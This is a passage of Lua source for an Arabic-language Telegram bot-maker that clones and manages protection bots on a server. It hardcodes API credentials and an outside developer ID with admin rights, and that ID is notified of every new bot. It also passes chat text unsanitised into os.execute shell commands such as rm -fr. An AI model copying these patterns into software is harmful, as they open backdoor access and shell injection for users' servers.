Server_Done = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
redis = dofile("./libs/redis.lua").connect("127.0.0.1", 6379)
serpent = dofile("./libs/serpent.lua")
JSON    = dofile("./libs/dkjson.lua")
json    = dofile("./libs/JSON.lua")
URL     = dofile("./libs/url.lua")
http    = require("socket.http")
https   = require("ssl.https")
-------------------------------------------------------------------
whoami = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '')
uptime=io.popen([[echo `uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"D,",h+0,"H,",m+0,"M."}'`]]):read('*a'):gsub('[\n\r]+', '')
CPUPer=io.popen([[echo `top -b -n1 | grep "Cpu(s)" | awk '{print $2 + $4}'`]]):read('*a'):gsub('[\n\r]+', '')
HardDisk=io.popen([[echo `df -lh | awk '{if ($6 == "/") { print $3"/"$2" ( "$5" )" }}'`]]):read('*a'):gsub('[\n\r]+', '')
linux_version=io.popen([[echo `lsb_release -ds`]]):read('*a'):gsub('[\n\r]+', '')
memUsedPrc=io.popen([[echo `free -m | awk 'NR==2{printf "%sMB/%sMB ( %.2f% )\n", $3,$2,$3*100/$2 }'`]]):read('*a'):gsub('[\n\r]+', '')
-------------------------------------------------------------------
Runbot = require('luatele')
-------------------------------------------------------------------
local infofile = io.open("./sudo.lua","r")
if not infofile then
if not redis:get(Server_Done.."token") then
os.execute('sudo rm -rf setup.lua')
io.write('\27[1;31mSend your Bot Token Now\n\27[0;39;49m')
local TokenBot = io.read()
if TokenBot and TokenBot:match('(%d+):(.*)') then
local url , res = https.request("https://api.telegram.org/bot"..TokenBot.."/getMe")
local Json_Info = JSON.decode(url)
if res ~= 200 then
print('\27[1;34mBot Token is Wrong\n')
else
io.write('\27[1;34mThe token been saved successfully \n\27[0;39;49m')
TheTokenBot = TokenBot:match("(%d+)")
os.execute('sudo rm -fr .infoBot/'..TheTokenBot)
redis:setex(Server_Done.."token",300,TokenBot)
end 
else
print('\27[1;34mToken not saved, try again')
end 
os.execute('lua5.3 start.lua')
end
if not redis:get(Server_Done.."id") then
io.write('\27[1;31mSend Developer ID\n\27[0;39;49m')
local UserId = io.read()
if UserId and UserId:match('%d+') then
io.write('\n\27[1;34mDeveloper ID saved \n\n\27[0;39;49m')
redis:setex(Server_Done.."id",300,UserId)
else
print('\n\27[1;34mDeveloper ID not saved\n')
end 
os.execute('lua5.3 start.lua')
end
local url , res = https.request('https://api.telegram.org/bot'..redis:get(Server_Done.."token")..'/getMe')
local Json_Info = JSON.decode(url)
local Inform = io.open("sudo.lua", 'w')
Inform:write([[
return {
	
Token = "]]..redis:get(Server_Done.."token")..[[",

id = ]]..redis:get(Server_Done.."id")..[[

}
]])
Inform:close()
local start = io.open("start", 'w')
start:write([[
cd $(cd $(dirname $0); pwd)
while(true) do
sudo lua5.3 start.lua
done
]])
start:close()
local Run = io.open("Run", 'w')
Run:write([[
cd $(cd $(dirname $0); pwd)
while(true) do
screen -S ]]..Json_Info.result.username..[[ -X kill
screen -S ]]..Json_Info.result.username..[[ ./start
done
]])
Run:close()
redis:del(Server_Done.."id")
redis:del(Server_Done.."token")
os.execute('cp -a ../uu/ ../'..Json_Info.result.username..' && rm -fr ~/uu')
os.execute('cd && cd '..Json_Info.result.username..';chmod +x start;chmod +x Run;./Run')
end
Information = dofile('./sudo.lua')
sudoid = Information.id
Token = Information.Token
bot_id = Token:match("(%d+)")
os.execute('sudo rm -fr .infoBot/'..bot_id)
bot = Runbot.set_config{
api_id=9375356,
api_hash='d10f30519a858d279cc5d4f16c491c66',
session_name=bot_id,
token=Token
}
Sudos = {sudoid,1127091205,1127091205}
Sudo_Id = 1127091205
function Bot(msg)  
local idbot = false  
if tonumber(msg.sender.user_id) == tonumber(bot_id) then  
idbot = true    
end  
return idbot  
end
function devB(user)  
local idSub = false  
for k,v in pairs(Sudos) do  
if tonumber(user) == tonumber(v) then  
idSub = true    
end
end  
return idSub
end
function getChatId(id) local chat = {} local id = tostring(id) if id:match('^-100') then local channel_id = id:gsub('-100', '') chat = {ID = channel_id, type = 'channel'} else local group_id = id:gsub('-', '') chat = {ID = group_id, type = 'group'} end return chat end
function scandirfile(directory) local i, t, popen = 0, {}, io.popen for filename in popen('ls '..directory..''):lines() do i = i + 1 t[i] = filename end return t end
function exi_filesx(cpath) local files = {} local pth = cpath for k, v in pairs(scandirfile(pth)) do table.insert(files, v) end return files end
function file_exia(name, cpath) for k,v in pairs(exi_filesx(cpath)) do if name == v then return true end end return false end
reply_markup = bot.replyMarkup{
type = 'keyboard',
resize = true,
is_personal = true,
data = {
{{text = 'حذف بوت ✖️',type = 'text'},{text ='صنع بوت ➕',type = 'text'}},
{{text ='ايقاف بوت 〰️',type = 'text'},{text ='تشغيل بوت ✔️',type = 'text'}},
{{text = 'تفعيل الوضع المجاني ▶️',type = 'text'},{text ='تعطيل الوضع المجاني ⏹',type = 'text'}},
{{text = 'معلومات السيرفر ⚠️',type = 'text'},{text ='المصنوعات ♾', type = 'text'},{text ='الاحصائيات 🔘', type = 'text'}},
{{text = 'تصفيه المصنوعات ♻️',type = 'text'}},
{{text = 'اذاعه 🔖',type = 'text'},{text = 'الاجباري 📢',type = 'text'}},
{{text = 'تحديث الصانع 🔁',type = 'text'},{text = "تحديث المصنوعات🔄", type = 'text'}},
{{text = 'إلغاء 🚫',type = 'text'}},
}
}
reply_markun = bot.replyMarkup{
type = 'keyboard',
resize = true,
is_personal = true,
data = {
{{text ='حذف البوت ✖️',type = 'text'},{text = 'صنع بوت ➕',type = 'text'}},
{{text = 'معرفة المزيد 📩',type = 'text'}},
}
}
reply_markuk = bot.replyMarkup{
type = 'keyboard',
resize = true,
is_personal = true,
data = {
{{text ='الغاء ✖️',type = 'text'},{text = 'تأكيد ✅',type = 'text'}},
}
}
reply_markui = bot.replyMarkup{
type = 'keyboard',
resize = true,
is_personal = true,
data = {
{{text = 'إلغاء 🚫',type = 'text'}},
}
}
function Run(msg,data)
if msg.content.text then
text = msg.content.text.text
if not redis:sismember(bot_id..":user_id",msg.sender.user_id) then
redis:sadd(bot_id..":user_id",msg.sender.user_id)
end
else 
text = nil
end
if bot.getChatId(msg.chat_id).type == "basicgroup" then 
if devB(msg.sender.user_id)  then
if text == 'إلغاء 🚫' then 
if redis:get(bot_id..":Send:"..msg.sender.user_id) then
redis:del(bot_id..":Send:"..msg.sender.user_id)
u = "*📫꒐ تم الغاء الاذاعة عزيزي*"
elseif redis:get(bot_id..":set:"..msg.chat_id..":addCh") then
redis:del(bot_id..":set:"..msg.chat_id..":addCh")
u = "*🔘꒐ تم الغاء تعيين الاشتراك الاجباري*"
elseif redis:get(bot_id.."Send:UserName"..msg.chat_id..":"..msg.sender.user_id) then
redis:del(bot_id.."Send:UserName"..msg.chat_id..":"..msg.sender.user_id) 
u = '*💢꒐ تم الغاء الطلب بنجاح.*'
elseif redis:get(bot_id.."Send:Token"..msg.chat_id..":"..msg.sender.user_id) then
redis:del(bot_id.."Send:Token"..msg.chat_id..":"..msg.sender.user_id)
u = '*💢꒐ تم الغاء الطلب بنجاح.*'
elseif redis:get(bot_id.."Del:Screen:And:Bot"..msg.chat_id..":"..msg.sender.user_id) then
redis:del(bot_id.."Del:Screen:And:Bot"..msg.chat_id..":"..msg.sender.user_id) 
u = '*💢꒐ تم الغاء الطلب بنجاح.*'
elseif redis:get(bot_id.."op:Screen"..msg.chat_id..":"..msg.sender.user_id) then
redis:del(bot_id.."op:Screen"..msg.chat_id..":"..msg.sender.user_id) 
u = '*💢꒐ تم الغاء الطلب بنجاح.*'
elseif redis:get(bot_id.."Del:Screen"..msg.chat_id..":"..msg.sender.user_id) then
redis:del(bot_id.."Del:Screen"..msg.chat_id..":"..msg.sender.user_id) 
u = '*💢꒐ تم الغاء الطلب بنجاح.*'
else
u = '*◾أهلا بك في صانع بوتات الحمايه 👋🏻 ،\n\n◽البوت مقدم من قناة »* [. 𝖲𝗈𝗎𝗋𝖼𝖾 MEGGA TeAm >](t.me/meggas) \n\n*◾يمكنك الان صنع بوت واحد فقط من صانع البوتات\n\n     عليك استخدام اوامر التحكم اسفل وبدء الانشاء🔻\n⎯ ⎯ ⎯ ⎯ ⎯ ⎯ ⎯ ⎯ ⎯ ⎯*\n[⚙️꒐ Gruop The Suport Maker .](https://t.me/Meggas)'
end
bot.sendText(msg.chat_id,msg.id,""..u.."", 'md', true , false, false, false, reply_markup)
return false
end
if redis:get(bot_id..":Send:"..msg.sender.user_id) then
lis = redis:smembers(bot_id..":user_id") 
if msg.forward_info or text or msg.content.video_note or msg.content.document or msg.content.audio or msg.content.video or msg.content.voice_note or msg.content.sticker or msg.content.animation or msg.content.photo then 
redis:del(bot_id..":Send:"..msg.sender.user_id)
bot.sendText(msg.chat_id,msg.id,"*🗣️꒐ يتم ارسال الرساله الى ( "..#lis.." عضو ) *","md",true)
for k,v in pairs(lis) do  
local FedMsg = bot.forwardMessages(v, msg.chat_id, msg.id,0,0,true,true,false)
if FedMsg then
redis:incr(bot_id..":count:true") 
end
end  
bot.sendText(msg.chat_id,msg.id,"*✅꒐ تمت الاذاعه بنجاح لـ ( "..redis:get(bot_id..":count:true").." ) عضو *","md",true)
redis:del(bot_id..":count:true") 
end
end
if text == 'اذاعه 🔖' then 
bot.sendText(msg.chat_id,msg.id,"*📩꒐ ارسل لي الاذاعة الان :*", 'md', false, false, false, false, bot.replyMarkup{type = 'keyboard',resize = true,is_personal = true,data = {{{text = 'إلغاء 🚫',type = 'text'}},}})
redis:setex(bot_id..":Send:"..msg.sender.user_id,600,true)  
return false
end
if redis:get(bot_id..":set:"..msg.chat_id..":addCh") then
if msg.forward_info then
redis:del(bot_id..":set:"..msg.chat_id..":addCh") 
if msg.forward_info.origin.chat_id then          
id_chat = msg.forward_info.origin.chat_id
else
bot.sendText(msg.chat_id,msg.id,"*⚠️꒐ عذرا يجب عليك ارسل توجيه من قناه فقط .*","md")
return false  
end     
sm = bot.getChatMember(id_chat,bot_id)
if sm.status.luatele == "chatMemberStatusAdministrator" then
redis:set(bot_id..":TheCh",id_chat) 
bot.sendText(msg.chat_id,msg.id,"*☑️꒐ تم حفظ القناه بنجاح *","md", true)
else
bot.sendText(msg.chat_id,msg.id,"*⚠️꒐ البوت ليس مشرف بالقناه. *","md", true)
end
end
end
if text == 'الاجباري 📢' then 
if not redis:get(bot_id..":TheCh") then
redis:setex(bot_id..":set:"..msg.chat_id..":addCh",600,true)  
return bot.sendText(msg.chat_id,msg.id,"*📥꒐ قم الان بأرسال توجيه من القناه الان *","md", false, false, false, false, bot.replyMarkup{type = 'keyboard',resize = true,is_personal = true,data = {{{text = 'إلغاء 🚫',type = 'text'}},}})  
elseif redis:get(bot_id..":TheCh") then
infokl = bot.getChatMember(redis:get(bot_id..":TheCh"),bot_id)
if infokl and infokl.status and infokl.status.luatele == "chatMemberStatusAdministrator" then
Get_Chat = bot.getChat(redis:get(bot_id..":TheCh"))
Info_Chats = bot.getSupergroupFullInfo(redis:get(bot_id..":TheCh"))
if Info_Chats and Info_Chats.invite_link and Info_Chats.invite_link.invite_link and  Get_Chat and Get_Chat.title then 
redis:setex(bot_id..":set:"..msg.chat_id..":addCh",600,true)  
return bot.sendText(msg.chat_id,msg.id,"*💢꒐ الاشتراك الاحباري مفعل على قناة :\n"..Info_Chats.invite_link.invite_link.."\n📭꒐ يمكنك تغييرها من خلال ارسال توجيه من قناه اخرى .\n🔖꒐ يمكنك الغاء العمليه من خلال الضغط اسفل .*","md", false, false, false, false, bot.replyMarkup{type = 'keyboard',resize = true,is_personal = true,data = {{{text = 'إلغاء 🚫',type = 'text'}},}})  
else
redis:setex(bot_id..":set:"..msg.chat_id..":addCh",600,true)  
return bot.sendText(msg.chat_id,msg.id,"*🔖꒐ ارسل لي توجية من القناة الأن :*","md", false, false, false, false, bot.replyMarkup{type = 'keyboard',resize = true,is_personal = true,data = {{{text = 'إلغاء 🚫',type = 'text'}},}})  
end
else
redis:setex(bot_id..":set:"..msg.chat_id..":addCh",600,true)  
return bot.sendText(msg.chat_id,msg.id,"*🔖꒐ ارسل لي توجية من القناة الأن :*","md", false, false, false, false, bot.replyMarkup{type = 'keyboard',resize = true,is_personal = true,data = {{{text = 'إلغاء 🚫',type = 'text'}},}})  
end
end
end
if text == 'الاحصائيات 🔘' then 
cubot = 0
for jj in io.popen('ls /root'):lines() do
if jj then 
if jj ~= bot.getMe().username then 
if jj and jj:match('(%S+)[Bb][Oo][Tt]') then
cubot = cubot +1
end
end
end
end 
bot.sendText(msg.chat_id,msg.id,"*📊꒐ الاحصائيات :*\n\n👤꒐ عدد المشتركين : { *"..(redis:scard(bot_id..":user_id") or 1).."* } مشترك .".."\n🔘꒐ عدد المصنوعات : ( *"..cubot.."* ) مصنوع .", 'md')
return false
end
if text == 'تفعيل الوضع المجاني ▶️' then
if redis:get(bot_id..":freebot") then
return bot.sendText(msg.chat_id,msg.id,'*📮꒐ تم تفعيله سابقا .*', 'md', false, false, false, false, reply_markup)
else
redis:set(bot_id..":freebot",true)
return bot.sendText(msg.chat_id,msg.id,'*☑️꒐ تم تفعيل الوضع المجاني بنجاح .*', 'md', false, false, false, false, reply_markup)
end
end
if text == 'تعطيل الوضع المجاني ⏹' then
if redis:get(bot_id..":freebot") then
redis:del(bot_id..":freebot")
return bot.sendText(msg.chat_id,msg.id,'*✖️꒐ تم تعطيل الوضع المجاني .*', 'md', false, false, false, false, reply_markup)
else
return bot.sendText(msg.chat_id,msg.id,'*💢꒐ معطل بالفعل .*', 'md', false, false, false, false, reply_markup)
end
end
if text ==  'تصفيه المصنوعات ♻️' then
i = 0
t = '▪︎تم تصفيه التالي : \n — — — — —\n'
for v in io.popen('ls /root'):lines() do
if v ~= bot.getMe().username then
if v and v:match('(%S+)[Bb][Oo][Tt]') then
fi = io.open("/root/"..v.."/sudo.lua"):read('*a')
TokenInfo = fi:match('Token = "(.*)"')
TokenInfo_id = TokenInfo:match("(%d+)")
local url , res = https.request('https://api.telegram.org/bot'..TokenInfo..'/getMe')
local Json_Info = JSON.decode(url)
if Json_Info.ok == false then
local keys = redis:keys(TokenInfo_id..'*')
for i = 1, #keys do 
redis:del(keys[i])
end
t = t.."@"..v.."\n"
os.execute('cd && rm -fr '..v..' && screen -d -m -S del screen -S '..v..' -X kill')
end
local keys = redis:keys(TokenInfo_id..'*')
b = 0
for i = 1, #keys do 
b = b + 1
end
if b <= 10 then
for i = 1, #keys do 
redis:del(keys[i])
end
t = t.."@"..v.."\n"
os.execute('cd && rm -fr '..v..' && screen -d -m -S del screen -S '..v..' -X kill')
end
end
end
end 
bot.sendText(msg.chat_id,msg.id,t, 'md')
return false
end
if text == "تحديث المصنوعات🔄" then
i = 0
t = '*⚙️꒐ تم تحديث جميع ملفات البوتات .\n\n📮꒐ ارسل اذاعة الى المطورين لعمل تحديث .*'
for v in io.popen('ls /root'):lines() do
if v then 
if v ~= bot.getMe().username then 
if v and v:match('(%S+)[Bb][Oo][Tt]') then
os.execute('cd ../'..v..' && rm -rf start.lua')
os.execute('cp -a ./Files/start.lua  ../'..v)
i = i +1
end
end
end
end 
if i == 0 then 
t = '*⚠️꒐ لا يوجد بوتات مصنوعة.*'
end
bot.sendText(msg.chat_id,msg.id,t,"md",true)  
return false
end
if text == 'تحديث الصانع 🔁' then    
bot.sendText(msg.chat_id,msg.id,'*🗂️꒐ تم تحديث ملفات الصانع بنجاح*',"md",true)  
dofile("start.lua") 
return false
end 
if text == "/start" then 
local bl = '*👋🏻꒐ أهلا بك في اوامر المطور الجاهزة*' 
return bot.sendText(msg.chat_id,msg.id,bl, 'md', false, false, false, false, reply_markup)
end
if redis:get(bot_id.."Send:UserName"..msg.chat_id..":"..msg.sender.user_id) == 'true1' then
local UserName = string.match(text, "@[%a%d_]+") 
if UserName then
local UserId_Info = bot.searchPublicChat(UserName)
if not UserId_Info.id then
bot.sendText(msg.chat_id,msg.id,"*🚸꒐ اليوزر ليس لحساب شخصي تأكد منه .*","md",true)  
return false
end
if UserId_Info.type.is_channel == true then
bot.sendText(msg.chat_id,msg.id,"*🚸꒐ اليوزر لقناه او مجموعه تأكد منه*","md",true)  
return false
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
bot.sendText(msg.chat_id,msg.id,"*⚠️꒐ عذرا يجب ان تستخدم معرف لحساب شخصي فقط .*","md",true)  
return false
end
redis:del(bot_id.."Send:UserName"..msg.chat_id..":"..msg.sender.user_id) 
local url , res = https.request('https://api.telegram.org/bot'..redis:get(bot_id.."Token:Bot"..msg.chat_id..":"..msg.sender.user_id)..'/getMe')
local Jsonfo = JSON.decode(url)
Sudo  = UserId_Info.id
file = io.open("./Files/sudo.lua", "w")  
file:write([[
return {
	
Token = "]]..redis:get(bot_id.."Token:Bot"..msg.chat_id..":"..msg.sender.user_id)..[[",

id = ]]..Sudo..[[

}
]])
file:close() 
file = io.open("./Files/start", "w")  
file:write([[
cd $(cd $(dirname $0); pwd)
while(true) do
sudo lua5.3 start.lua
done
]])  
u , res = https.request('https://api.telegram.org/bot'..redis:get(bot_id.."Token:Bot"..msg.chat_id..":"..msg.sender.user_id)..'/getMe')
JsonSInfo = JSON.decode(u)
useyu = string.upper(JsonSInfo['result']['username']:gsub('@',''))
file:close()  
file = io.open("./Files/Run", "w")  
file:write([[
cd $(cd $(dirname $0); pwd)
while(true) do
screen -S ]]..useyu..[[ -X kill
screen -S ]]..useyu..[[ ./start
done
]])  
file:close() 
os.execute('cp -a ./Files/. ../'..useyu..' && cd && cd '..useyu..' && screen -d -m -S '..useyu..' lua5.3 start.lua')
redis:del(bot_id.."Token:Bot"..msg.chat_id..":"..msg.sender.user_id) 
bot.sendText(msg.chat_id,msg.id,'☑️꒐ تم حفظ معلومات المطور وتم تشغيل البوت بنجاح..', 'md')
return false  
end
end
if redis:get(bot_id.."Send:Token"..msg.chat_id..":"..msg.sender.user_id) == 'true' then
if text and text:match("^(%d+)(:)(.*)") then
local url , res = https.request('https://api.telegram.org/bot'..text..'/getMe')
local Json_Info = JSON.decode(url)
if Json_Info.ok == false then
bot.sendText(msg.chat_id,msg.id,'*⚠️꒐ التوكن خطأ ارسل توكن صالح*', 'md')
return false
else
NameBot = Json_Info.result.first_name
UserNameBot = Json_Info.result.username
NameBot = NameBot:gsub('"','') 
NameBot = NameBot:gsub("'",'') 
NameBot = NameBot:gsub('`','') 
NameBot = NameBot:gsub('*','') 
redis:del(bot_id.."Send:Token"..msg.chat_id..":"..msg.sender.user_id) 
redis:set(bot_id.."Send:UserName"..msg.chat_id..":"..msg.sender.user_id,'true1') 
redis:set(bot_id.."Token:Bot"..msg.chat_id..":"..msg.sender.user_id,text) 
bot.sendText(msg.chat_id,msg.id,'*🔘꒐ تم حفظ توكن البوت بنجاح .\n\n📜꒐معلومات البوت التالية : \n\n• اسم البوت ›* ['..NameBot..'](t.me/'..UserNameBot..')\n*• معرف البوت ›* [@'..UserNameBot..']\n\n*📮꒐ ارسل لي معرف المطور ..*', 'md', false, false, false, false, reply_markup)
return false
end
end
end
if text == 'صنع بوت ➕' then
redis:set(bot_id.."Send:Token"..msg.chat_id..":"..msg.sender.user_id,'true') 
bot.sendText(msg.chat_id,msg.id,'*📭꒐ قم بارسال توكن البوت الان :*',"md",true)  
return false
end
if redis:get(bot_id.."Del:Screen:And:Bot"..msg.chat_id..":"..msg.sender.user_id) == 'true' then
user_b = string.upper(text:gsub('@',''))
if file_exia(user_b,'/root') then
if user_b == string.upper(bot.getMe().username) then 
bot.sendText(msg.chat_id,msg.id,'*⚠️꒐ خطأ في معرف البوت تأكد منه*', 'md')
return false 
end 
if text and text:match('(%S+)[Bb][Oo][Tt]') then 
redis:del(bot_id.."Del:Screen:And:Bot"..msg.chat_id..":"..msg.sender.user_id)
os.execute('screen -S '..user_b..' -X kill')
os.execute('cd && rm -fr '..user_b)
bot.sendText(msg.chat_id,msg.id,'*⛔꒐ تم حذف وايقاف البوت بنجاح*', 'md')
end
else
redis:del(bot_id.."Del:Screen:And:Bot"..msg.chat_id..":"..msg.sender.user_id)
bot.sendText(msg.chat_id,msg.id,'*⚠️꒐ عذرا لم يتم التعرف على البوت او لا يوجد*', 'md')
end
end
if text == 'حذف بوت ✖️' then
redis:set(bot_id.."Del:Screen:And:Bot"..msg.chat_id..":"..msg.sender.user_id,'true') 
bot.sendText(msg.chat_id,msg.id,'*🔖꒐ قم بأرسال معرف البوت الان*', 'md')
return false
end
if text == 'المصنوعات ♾' then
local i = 0
local t = '🔘꒐ قائمة المصنوعات \n — — — — —\n'
for v in io.popen('ls /root'):lines() do
if v then 
if v ~= bot.getMe().username then 
if v and v:match('(%S+)[Bb][Oo][Tt]') then 
i = i +1
t = t..'*'..i..'- * [@'..v..'] \n' 
end
end 
end
end 
if i == 0 then 
t = '*⚠️꒐ لا يوجد مصنوعات.*'
end
bot.sendText(msg.chat_id,msg.id,t, 'md')
return false
end
if redis:get(bot_id.."Del:Screen"..msg.chat_id..":"..msg.sender.user_id) == 'true' then
if text and text:match('(%S+)[Bb][Oo][Tt]') then
user_b = string.upper(text:gsub('@',''))
if user_b == string.upper(bot.getMe().username) then 
bot.sendText(msg.chat_id,msg.id,'*⚠️꒐ خطأ في معرف البوت تأكد منه*', 'md', false, false, false, false, reply_markup)
return false 
end
redis:del(bot_id.."Del:Screen"..msg.chat_id..":"..msg.sender.user_id) 
os.execute('screen -S '..user_b..' -X kill')
bot.sendText(msg.chat_id,msg.id,'*🔘꒐ تم ايقاف تشغيل البوت بنجاح*', 'md')
return false  
end 
end 
if text == 'ايقاف بوت 〰️' then
redis:set(bot_id.."Del:Screen"..msg.chat_id..":"..msg.sender.user_id,'true') 
bot.sendText(msg.chat_id,msg.id,'*📤꒐ قم بارسال معرف البوت الان بدون @*', 'md')
return false
end
if redis:get(bot_id.."op:Screen"..msg.chat_id..":"..msg.sender.user_id) == 'true' then
user_b = string.upper(text:gsub('@',''))
if file_exia(text,'/root') then
if user_b ~= bot.getMe().username then 
if text and text:match('(%S+)[Bb][Oo][Tt]') then 
redis:del(bot_id.."op:Screen"..msg.chat_id..":"..msg.sender.user_id) 
os.execute('cd && cd '..user_b..';screen -d -m -S '..user_b..' lua5.3 start.lua')
bot.sendText(msg.chat_id,msg.id,'*✅꒐ تم تشغيل البوت بنجاح*', 'md')
return false  
else
bot.sendText(msg.chat_id,msg.id,'*🚸꒐ المعرف غير مسجل لدي*', 'md')
end 
else
bot.sendText(msg.chat_id,msg.id,'*📛꒐ لا يمكنك عمل رن للمصنع الاساسي*', 'md')
end 
else
bot.sendText(msg.chat_id,msg.id,'*⚠️꒐ لا يوجد بوت مصنوع بهذا المعرف*', 'md')
end 
end 
if text == 'تشغيل بوت ✔️' then
redis:set(bot_id.."op:Screen"..msg.chat_id..":"..msg.sender.user_id,'true') 
bot.sendText(msg.chat_id,msg.id,'*📮꒐ قم بارسال معرف البوت بدون @ الان*', 'md')
return false
end
if text == 'معلومات السيرفر ⚠️' then
bot.sendText(msg.chat_id,msg.id,"• Server Info .\n\n• Server Version : "..linux_version.."\n\n• Server CPU  : "..CPUPer.."\n\n• Server Ram : "..memUsedPrc.."\n\n• Server HardDesk : "..HardDisk.."\n\n• Server UpTime : "..uptime.."\n\n• Server User : "..whoami,"md",true)  
return false
end
end --- end devB(
if not devB(msg.sender.user_id)  then
if msg and redis:get(bot_id..":TheCh") then
local Channel = redis:get(bot_id..":TheCh")
if Channel then
if bot.getChatMember(Channel,bot_id) and bot.getChatMember(Channel,bot_id).status and bot.getChatMember(Channel,bot_id).status.luatele == "chatMemberStatusAdministrator" then
Get_Chat = bot.getChat(Channel)
Info_Chats = bot.getSupergroupFullInfo(Channel)
if Get_Chat and Get_Chat.title then
if Info_Chats and Info_Chats.invite_link and Info_Chats.invite_link.invite_link then
local url , res = https.request('https://api.telegram.org/bot'..Token..'/getchatmember?chat_id='..Channel..'&user_id='..msg.sender.user_id)
local ChannelJoin = JSON.decode(url)
if ChannelJoin.result.status == "left" then
local reply_inline = bot.replyMarkup{
type = 'inline',
data = {{{text = Get_Chat.title, url = Info_Chats.invite_link.invite_link}},}}
return bot.sendText(msg.chat_id,msg.id,"*\n🚸| عذرا عزيزي .\n🔰| عليك الاشتراك بقناة البوت لتتمكن من استخدامه\n\n- "..Info_Chats.invite_link.invite_link.."\n\n‼️| اشترك ثم ارسل /start*", 'md',true, false, false, false, reply_inline)
end
end
end
end
end
end
if text == "/start" then 
local bl = '*◾أهلا بك في صانع بوتات الحمايه 👋🏻 ،\n\n◽البوت مقدم من قناة »* [. 𝖲𝗈𝗎𝗋𝖼𝖾 Megga TeAm >](t.me/Meggas) \n\n*◾يمكنك الان صنع بوت واحد فقط من صانع البوتات\n\n     عليك استخدام اوامر التحكم اسفل وبدء الانشاء🔻\n⎯ ⎯ ⎯ ⎯ ⎯ ⎯ ⎯ ⎯ ⎯ ⎯*\n[⚙️꒐ Gruop The Suport Maker .](https://t.me/Meggas)'
return bot.sendText(msg.chat_id,msg.id,bl, 'md', true , false, false, false, reply_markun)
end
if text == 'معرفة المزيد 📩' then 
return bot.sendText(msg.chat_id,msg.id,[[*
- مرحباً بك من جديد عزيزي 👋🏻

- تم انشاء الصانع مقدم من قناة ( @Meggas ) مجاناً 

• مطور الصانع 
• @kkkk5k

• الاصدار  : 2.1.0

• تاريخ الانشاء :* ( `2022/3/3` )
*⎯ ⎯ ⎯ ⎯ ⎯ ⎯ ⎯ ⎯
- قناة شروحات السورس : @Meggas .
- قناتنا دعم السورس : @KKKK5K .*
]], 'md', false, false, false, false, reply_markun)
end
if redis:get(bot_id.."Send:Token"..msg.chat_id..":"..msg.sender.user_id) == 'true' then
if text == 'إلغاء 🚫' then
local bl = '*💢꒐ تم الغاء الطلب بنجاح*'
redis:del(bot_id.."Send:Token"..msg.chat_id..":"..msg.sender.user_id)
bot.sendText(msg.chat_id,msg.id,bl, 'md', false, false, false, false, reply_markun)
return false
end
if text and text:match("^(%d+)(:)(.*)") then
local url , res = https.request('https://api.telegram.org/bot'..text..'/getMe')
local Json_Info = JSON.decode(url)
if Json_Info.ok == false then
bot.sendText(msg.chat_id,msg.id,'*⚠️꒐ التوكن خطأ ارسل توكن صالح*', 'md')
return false
else
local url , res = https.request('https://api.telegram.org/bot'..text..'/getMe')
local Jsonfo = JSON.decode(url)
Sudo  = msg.sender.user_id
file = io.open("./Files/sudo.lua", "w")  
file:write([[
return {
	
Token = "]]..text..[[",

id = ]]..Sudo..[[

}
]])
file:close() 
file = io.open("./Files/start", "w")  
file:write([[
cd $(cd $(dirname $0); pwd)
while(true) do
sudo lua5.3 start.lua
done
]])  
u , res = https.request('https://api.telegram.org/bot'..text..'/getMe')
JsonSInfo = JSON.decode(u)
useyu = string.upper(JsonSInfo['result']['username'])
file:close()  
file = io.open("./Files/Run", "w")  
file:write([[
cd $(cd $(dirname $0); pwd)
while(true) do
screen -S ]]..useyu..[[ -X kill
screen -S ]]..useyu..[[ ./start
done
]])  
file:close() 
os.execute('cp -a ./Files/. ../'..useyu..' && cd && cd '..useyu..' && screen -d -m -S '..useyu..' lua5.3 start.lua')
UserNameBot = Json_Info.result.username
NameBot = Json_Info.result.first_name
NameBot = NameBot:gsub('"','') 
NameBot = NameBot:gsub("'",'') 
NameBot = NameBot:gsub('`','') 
NameBot = NameBot:gsub('*','') 
redis:set(bot_id..":Bot:"..msg.sender.user_id,useyu)
redis:del(bot_id.."Send:Token"..msg.chat_id..":"..msg.sender.user_id) 
bot.sendText(msg.chat_id,msg.id,"*✅꒐ تم صنع البوت الخاص بك بنجاح .*\n\n- أسم البوت › ["..NameBot.."](t.me/"..UserNameBot..")\n\n- معرف البوت › @["..UserNameBot.."]", 'md', false, false, false, false, reply_markun)
bot.sendText(Sudo_Id,msg.id,"*👤꒐ قام شخص بصنع بوت جديد .. *\n\n*📌꒐ اسم البوت ›* ["..NameBot.."](t.me/"..UserNameBot..")\n\n*🖇️꒐ معرف البوت ›* @["..UserNameBot.."] .", 'md', false, false, false, false, reply_markup)
return false
end
end
end
if text == 'صنع بوت ➕' then
if redis:get(bot_id..":freebot") then
if redis:get(bot_id..":Bot:"..msg.sender.user_id) then
return bot.sendText(msg.chat_id,msg.id,'*⚠️꒐ لديك بوت من المصنع بالفعل .*', 'md')
else
redis:set(bot_id.."Send:Token"..msg.chat_id..":"..msg.sender.user_id,'true') 
return bot.sendText(msg.chat_id,msg.id,'*📭꒐ قم بارسال توكن البوت الان :*',"md", false, false, false, false, reply_markui)
end
else
return bot.sendText(msg.chat_id,msg.id,'*⚠️꒐ عذرأ ، تم ايقاف الوضع المجاني من خلال مطور البوت  يفتح في بضع ساعات او يوجد صيانة في الصانع \n - بوت الدعم : @Meggas*', 'md', false, false, false, false, reply_markun)
end
end
if text and redis:get(bot_id.."Del:S:Bot"..msg.chat_id..":"..msg.sender.user_id) == 'true' then
if text == 'الغاء ✖️' then
local bl = '*💢꒐ تم الغاء الطلب بنجاح*'
redis:del(bot_id.."Del:S:Bot"..msg.chat_id..":"..msg.sender.user_id) 
bot.sendText(msg.chat_id,msg.id,bl, 'md', false, false, false, false, reply_markun)
return false  
end 
os.execute('screen -S '..redis:get(bot_id..":Bot:"..msg.sender.user_id)..' -X kill')
os.execute('cd && rm -fr '..redis:get(bot_id..":Bot:"..msg.sender.user_id))
redis:del(bot_id..":Bot:"..msg.sender.user_id)
redis:del(bot_id.."Del:S:Bot"..msg.chat_id..":"..msg.sender.user_id) 
bot.sendText(msg.chat_id,msg.id,'*☑️꒐ تم حذف وايقاف البوت بنجاح*', 'md',false, false, false, false, reply_markun)
end
if text == 'حذف البوت ✖️' then
